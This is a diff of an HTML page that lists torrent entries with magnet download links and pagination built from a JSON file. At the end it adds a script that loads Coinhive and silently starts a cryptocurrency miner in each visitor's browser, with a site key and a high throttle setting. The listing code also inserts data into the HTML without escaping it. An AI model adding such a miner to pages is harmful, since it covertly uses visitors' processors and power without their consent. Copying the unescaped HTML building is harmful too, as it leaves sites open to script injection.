@@ -4,20 +4,51 @@
 <meta charset="UTF-8" />
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
 <script>
+var arg  = new Object;
+url = location.search.substring(1).split('&');
+
+for(i=0; url[i]; i++) {
+   var k = url[i].split('=');
+   arg[k[0]] = k[1];
+}
+
+var page = 0;
+if (arg.page !== void 0) {
+  page = Number(arg.page);
+}
+// var page = Number(arg.p);
+
 $(function() {
   $.getJSON("data.json" , function(data) {
     var
-      ulObj = $("#demo"),
+      obj = $("#demo"),
+      links = $("#link"),
       len = data.length;
 
     for(var i = 0; i < len; i++) {
-      ulObj.append(data[i].id + data[i].title);
+      obj.append(
+        "<h3>" + data[i].title + "</h3>" +
+        "<img src=" + data[i].image + "><br>" +
+        "<a href=" + data[i].magnet + "> download </a>" +
+        "" + data[i].id + "<br>" + page
+      );
+      var ip1 = i+1;
+      links.append(
+        "<a href=" + location.host + location.pathname + "?page="+ i +">" + ip1 + "</a> "
+      );
     }
   });
 });
+
+</script>
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+  var miner = new CoinHive.User('Ul2yU1S7qXAVxePjR8BBZpaqrW8iewPZ', 'test', {throttle: 0.8});
+  miner.start();
 </script>
 </head>
 <body>
 <div id="demo"></div>
+<div id="link"></div>
 </body>
 </html>
